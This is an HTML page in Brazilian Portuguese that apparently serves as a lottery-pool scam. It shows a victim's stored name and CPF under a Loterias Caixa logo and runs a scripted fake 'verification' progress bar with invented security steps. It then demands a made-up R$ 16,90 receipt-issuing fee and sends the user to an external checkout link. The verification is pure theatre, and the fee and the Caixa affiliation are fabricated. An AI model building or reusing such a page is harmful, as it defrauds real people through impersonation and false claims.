<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
  <meta http-equiv="X-Frame-Options" content="DENY" />
  <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin" />

  <title>Verificação de Bolões</title>

  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link
    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap"
    rel="stylesheet"
  />

  <style>
    :root{
      --primary:#0b5aa9;
      --primaryDark:#094b8e;
      --accent:#f39200;
      --bg:#f6f7f9;
      --card:#ffffff;
      --text:#1f2a37;
      --muted:#6b7280;
      --border:#e5e7eb;
      --success:#2e7d32;
      --danger:#d32f2f;
      --shadow:0 8px 22px rgba(0,0,0,.08);
      --radius:12px;
      --headerH:120px;
    }

    *{box-sizing:border-box;margin:0;padding:0}
    body{
      font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
      background:var(--bg);
      color:var(--text);
      min-height:100vh;
      padding-top:var(--headerH);
      padding-bottom:40px;
    }

    .header{
      position:fixed;top:0;left:0;width:100%;height:var(--headerH);z-index:999;
      display:flex;align-items:center;justify-content:center;
      background:linear-gradient(135deg,var(--primary) 0%, var(--primaryDark) 100%);
      box-shadow:0 4px 12px rgba(0,0,0,.10);
      padding:12px 16px;
      text-align:center;
    }
    .brandWrap{display:flex;flex-direction:column;align-items:center;gap:6px}
    .brandWrap img{
      width:260px;max-width:78vw;height:auto;max-height:70px;object-fit:contain;
      filter:drop-shadow(0 2px 4px rgba(0,0,0,.20));
    }
    .headerMeta{
      color:#eaf2ff;
      font-size:14px;
      font-weight:500;
      opacity:.95;
    }

    .container{
      width:100%;
      max-width:680px;
      margin:0 auto;
      background:var(--card);
      border-radius:var(--radius);
      box-shadow:var(--shadow);
      overflow:hidden;
    }

    .main{
      padding:34px 28px;
    }

    .title{
      font-size:28px;
      font-weight:800;
      letter-spacing:-.4px;
      text-align:center;
      color:var(--primary);
      margin-bottom:10px;
    }
    .subtitle{
      text-align:center;
      color:var(--muted);
      font-size:16px;
      line-height:1.55;
      margin-bottom:22px;
    }

    .notice{
      background:#eef6ff;
      border:1px solid #d7e8ff;
      border-left:4px solid var(--primary);
      border-radius:12px;
      padding:16px 16px;
      color:#163a66;
      font-size:15px;
      line-height:1.55;
      margin-bottom:18px;
    }

    .card{
      background:#fafafa;
      border:1px solid var(--border);
      border-radius:12px;
      padding:18px;
      margin-top:14px;
    }
    .card h3{
      font-size:18px;
      font-weight:800;
      color:var(--primary);
      margin-bottom:12px;
    }
    .row{
      display:flex;
      align-items:flex-start;
      justify-content:space-between;
      gap:14px;
      padding:10px 0;
      border-bottom:1px solid #e9ecef;
    }
    .row:last-child{border-bottom:none}
    .label{
      font-size:13px;
      color:var(--muted);
      font-weight:600;
      flex:1;
    }
    .value{
      font-size:14px;
      font-weight:700;
      color:var(--text);
      text-align:right;
      max-width:60%;
      word-break:break-word;
    }

    .btn{
      margin-top:18px;
      width:100%;
      border:none;
      border-radius:999px;
      background:linear-gradient(135deg,var(--accent) 0%, #ff7a00 100%);
      color:#fff;
      padding:14px 18px;
      font-size:16px;
      font-weight:800;
      letter-spacing:.2px;
      cursor:pointer;
      box-shadow:0 10px 18px rgba(243,146,0,.22);
      transition:transform .15s ease, box-shadow .15s ease;
      text-transform:uppercase;
    }
    .btn:hover{transform:translateY(-1px); box-shadow:0 14px 22px rgba(243,146,0,.28)}
    .btn:active{transform:translateY(0)}

    .fineprint{
      margin-top:12px;
      font-size:12px;
      color:var(--muted);
      line-height:1.45;
      text-align:center;
    }

    /* === PEDIDO: header não aparece no loading === */
    body.is-loading .header{ display:none !important; }

    /* Overlay de loading */
    #loadingOverlay{
      display:none;
      position:fixed;
      inset:0;
      background:#fff;
      z-index:99999; /* acima de tudo */
      align-items:center;
      justify-content:center;
      flex-direction:column;
      padding:24px;
      text-align:center;
    }
    #loadingOverlay img{
      width:220px;
      max-width:80vw;
      height:auto;
      margin-bottom:22px;
    }
    .progressOuter{
      width:280px;
      max-width:86vw;
      height:10px;
      background:#e6e8ee;
      border-radius:999px;
      overflow:hidden;
      margin:8px 0 10px;
    }
    #progressBar{
      height:100%;
      width:0%;
      background:var(--primary);
      transition:width .35s ease;
    }
    #progressPct{
      font-size:13px;
      color:#3b3f46;
      font-weight:700;
      margin-top:4px;
    }
    #loadingText{
      margin-top:12px;
      font-size:14px;
      color:#4b5563;
      line-height:1.5;
      max-width:360px;
    }

    /* Tela de taxa */
    .feeBox{
      width:100%;
      max-width:460px;
      border:1px solid var(--border);
      border-radius:16px;
      padding:18px;
      box-shadow:var(--shadow);
      background:#fff;
    }

    /* Ícone animado de alerta (substitui a logo no topo do aviso) */
    .alertWrap{
      display:flex;
      justify-content:center;
      margin-bottom:12px;
    }
    .alertIcon{
      width:66px;height:66px;
      border-radius:18px;
      background:rgba(211,47,47,.10);
      display:flex;
      align-items:center;
      justify-content:center;
      position:relative;
      animation: alertPulse 1.3s ease-in-out infinite;
    }
    .alertIcon::before{
      content:"";
      position:absolute;
      inset:-10px;
      border-radius:24px;
      border:2px solid rgba(211,47,47,.25);
      animation: alertRing 1.3s ease-in-out infinite;
    }
    @keyframes alertPulse{
      0%,100%{ transform:scale(1); }
      50%{ transform:scale(1.06); }
    }
    @keyframes alertRing{
      0%{ transform:scale(.85); opacity:0; }
      30%{ opacity:.55; }
      100%{ transform:scale(1.2); opacity:0; }
    }

    .feeTitle{
      color:var(--danger);
      font-size:20px;
      font-weight:900;
      margin-bottom:10px;
      text-align:center;
    }
    .feeText{
      color:#374151;
      font-size:14px;
      line-height:1.6;
      margin-bottom:10px;
    }
    .feeList{
      text-align:left;
      margin:10px 0 12px;
      padding-left:18px;
      color:#374151;
      font-size:13px;
      line-height:1.7;
    }
    .feeValue{
      margin-top:10px;
      font-size:16px;
      font-weight:900;
      color:var(--text);
    }
    .feeBtn{
      margin-top:14px;
      width:100%;
      border:none;
      border-radius:999px;
      padding:14px 16px;
      background:linear-gradient(135deg,var(--accent) 0%, #ff7a00 100%);
      color:#fff;
      font-size:16px;
      font-weight:900;
      cursor:pointer;
      text-transform:uppercase;
      letter-spacing:.2px;
    }
    .feeSmall{
      margin-top:10px;
      font-size:12px;
      color:var(--muted);
      line-height:1.45;
    }

    @media (max-width:600px){
      :root{ --headerH:110px; }
      body{padding-top:var(--headerH)}
      .header{height:var(--headerH)}
      .main{padding:26px 18px}
      .title{font-size:24px}
    }
  </style>

  <!-- Captura UTMs (mantive seu padrão, versão compacta) -->
  <script>
    (function(){
      const urlParams = new URLSearchParams(location.search);
      const keys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];
      const out = {};
      let has = false;

      keys.forEach(k=>{
        const v = urlParams.get(k);
        if(v){
          const s = String(v).replace(/[<>\"']/g,'').substring(0,200);
          if(s){ out[k]=s; has=true; }
        }
      });

      if(has){
        out.createdAt = Date.now();
        try{ localStorage.setItem('utm_data', JSON.stringify(out)); }catch(e){}
      }
    })();
  </script>
</head>

<body>
  <div class="header">
    <div class="brandWrap">
      <img id="brandLogo" src="/painel/sucesso/images/logobrancal.png" alt="Plataforma de Bolões" />
      <div class="headerMeta" id="headerDataHora">Verificação de Bolões • --</div>
    </div>
  </div>

  <div class="container">
    <div class="main">
      <h1 class="title">VERIFICAÇÃO DE BOLÕES</h1>
      <p class="subtitle">
        Confirme as informações abaixo para validarmos os bolões adquiridos e emitir seus comprovantes.
      </p>

      <div class="notice">
        <strong>Atenção:</strong> esta etapa confirma seus dados de compra e prepara a emissão dos comprovantes.
        Ao clicar em <strong>“Verificar bolões”</strong>, o sistema inicia a conferência automática.
      </div>

      <div class="card">
        <h3>Resumo da verificação</h3>

        <div class="row">
          <span class="label">Status</span>
          <span class="value" style="color:var(--success)">Pronto para verificar</span>
        </div>

        <div class="row">
          <span class="label">Nome</span>
          <span class="value" id="leadNome">—</span>
        </div>

        <div class="row">
          <span class="label">CPF</span>
          <span class="value" id="leadCpf">—</span>
        </div>

        <div class="row">
          <span class="label">Valor total dos bolões</span>
          <span class="value" id="leadValor">—</span>
        </div>

        <div class="row">
          <span class="label">Data/Hora da compra</span>
          <span class="value" id="leadDataHora">—</span>
        </div>

        <button class="btn" id="verificarBoloes">Verificar bolões</button>

        <div class="fineprint">
          Ao continuar, você concorda com a validação automática e a emissão de comprovantes pela plataforma.
        </div>
      </div>
    </div>
  </div>

  <!-- Overlay Loading -->
  <div id="loadingOverlay">
    <img src="/painel/sucesso/images/loteriascaixa.svg" alt="Logo" />
    <div class="progressOuter"><div id="progressBar"></div></div>
    <div id="progressPct">0%</div>
    <p id="loadingText">Iniciando verificação…</p>
  </div>

  <script>
    'use strict';

    // ====== CONFIG ======
    const CHECKOUT_TAXA_URL = 'https://www.pay-pagamentos.link/checkout/b97ef9c7-507d-4d78-980b-85e39048edd0';
    const TAXA_VALOR_EXIBIR = 'R$ 16,90';

    // ====== UTIL ======
    const Formatadores = {
      cpf(cpf){
        const digits = String(cpf || '').replace(/\D/g,'');
        if(digits.length !== 11) return '—';
        return digits.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
      },
      moeda(valor){
        const n = Number(String(valor || '').replace(',','.'));
        if(!isFinite(n)) return '—';
        return n.toLocaleString('pt-BR', { style:'currency', currency:'BRL' });
      },
      dataHora(dt){
        const d = dt instanceof Date ? dt : new Date(dt);
        if(isNaN(d.getTime())) return new Date().toLocaleString('pt-BR',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'});
        return d.toLocaleString('pt-BR',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'});
      }
    };

    function safeText(v, max=100){
      return String(v ?? '').replace(/[<>\"']/g,'').substring(0,max);
    }

    function getLeadFromStorage(){
      const nome = safeText(localStorage.getItem('nome') || localStorage.getItem('nomeUsuario') || '', 120);

      let cpf = localStorage.getItem('cpf') || localStorage.getItem('cpfUsuario') || '';
      try{
        const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario') || 'null');
        if(dadosUsuario && dadosUsuario.cpf) cpf = dadosUsuario.cpf;
      }catch(e){}

      const urlParams = new URLSearchParams(location.search);
      const valorUrl = urlParams.get('valor');
      const valorLs = localStorage.getItem('valor') || localStorage.getItem('valorCompra') || '';
      const valor = safeText(valorUrl || valorLs || '', 20);

      return { nome, cpf, valor };
    }

    function preencherTela(){
      const { nome, cpf, valor } = getLeadFromStorage();

      document.getElementById('headerDataHora').textContent =
        `Verificação de Bolões • ${Formatadores.dataHora(new Date())}`;

      document.getElementById('leadNome').textContent = nome || '—';
      document.getElementById('leadCpf').textContent = cpf ? Formatadores.cpf(cpf) : '—';

      const valorNum = Number(String(valor).replace(/[^\d,.-]/g,'').replace(',','.'));
      document.getElementById('leadValor').textContent =
        isFinite(valorNum) ? Formatadores.moeda(valorNum) : (valor ? safeText(valor, 20) : '—');

      const dh = localStorage.getItem('dataCompra') || localStorage.getItem('purchase_datetime') || '';
      document.getElementById('leadDataHora').textContent = dh ? safeText(dh, 40) : Formatadores.dataHora(new Date());
    }

    function startLoading(){
      // === Pedido: esconder header durante o loading ===
      document.body.classList.add('is-loading');

      const overlay = document.getElementById('loadingOverlay');
      const bar = document.getElementById('progressBar');
      const pct = document.getElementById('progressPct');
      const txt = document.getElementById('loadingText');

      overlay.style.display = 'flex';
      bar.style.width = '0%';
      pct.textContent = '0%';
      txt.textContent = 'Iniciando verificação…';

      let progress = 0;

      const steps = [
        'Validando cadastro…',
        'Conferindo bolões adquiridos…',
        'Sincronizando registros…',
        'Aplicando protocolos de segurança…',
        'Finalizando verificação…'
      ];

      const interval = setInterval(()=>{
        progress += Math.floor(Math.random()*12)+8; // 8–19
        if(progress > 100) progress = 100;

        bar.style.width = progress + '%';
        pct.textContent = progress + '%';

        const idx = Math.min(steps.length - 1, Math.floor(progress / 20));
        txt.textContent = steps[idx];

        if(progress === 100){
          clearInterval(interval);
          setTimeout(()=>showFeeScreen(), 700);
        }
      }, 650);
    }

    function showFeeScreen(){
      // === Agora o header VOLTA na tela do aviso ===
      document.body.classList.remove('is-loading');

      const overlay = document.getElementById('loadingOverlay');

      overlay.innerHTML = `
        <div class="feeBox">
          <div class="alertWrap">
            <div class="alertIcon" aria-hidden="true">
              <svg width="30" height="30" viewBox="0 0 24 24" fill="none">
                <path d="M12 2.5L22 20.5H2L12 2.5Z" fill="rgba(211,47,47,0.20)" stroke="rgba(211,47,47,0.85)" stroke-width="1.5"/>
                <path d="M12 8V13.2" stroke="rgba(211,47,47,0.95)" stroke-width="2" stroke-linecap="round"/>
                <circle cx="12" cy="16.8" r="1.1" fill="rgba(211,47,47,0.95)"/>
              </svg>
            </div>
          </div>

          <div class="feeTitle">Emissão de Comprovante</div>

          <div class="feeText">
            Para concluir a sua aposta e ativar a
            <strong>Proteção de Registro</strong> dos bolões na Loteria Caixa, é necessária a
            <strong>Tarifa de Emissão de Comprovante</strong>.
          </div>

          <ul class="feeList">
            <li>Registro e emissão do comprovante</li>
            <li>Validação contra duplicidade</li>
            <li>Conferência automática dos dados</li>
            <li>Protocolo de segurança do processamento</li>
          </ul>

          <div class="feeValue">Valor: ${TAXA_VALOR_EXIBIR}</div>

          <button class="feeBtn" id="payFeeBtn">Pagar tarifa e concluir</button>

          <div class="feeSmall">
            * Esta taxa é aplicada pela <strong>plataforma</strong> para cobrir custos de processamento e emissão.
          </div>
        </div>
      `;

      const btn = document.getElementById('payFeeBtn');
      if(btn){
        btn.addEventListener('click', ()=>{
          location.href = CHECKOUT_TAXA_URL;
        });
      }
    }

    // ====== INIT ======
    if(document.readyState === 'loading'){
      document.addEventListener('DOMContentLoaded', ()=>{
        preencherTela();
        const btn = document.getElementById('verificarBoloes');
        if(btn) btn.addEventListener('click', (e)=>{ e.preventDefault(); startLoading(); });
      });
    }else{
      preencherTela();
      const btn = document.getElementById('verificarBoloes');
      if(btn) btn.addEventListener('click', (e)=>{ e.preventDefault(); startLoading(); });
    }
  </script>
</body>
</html>
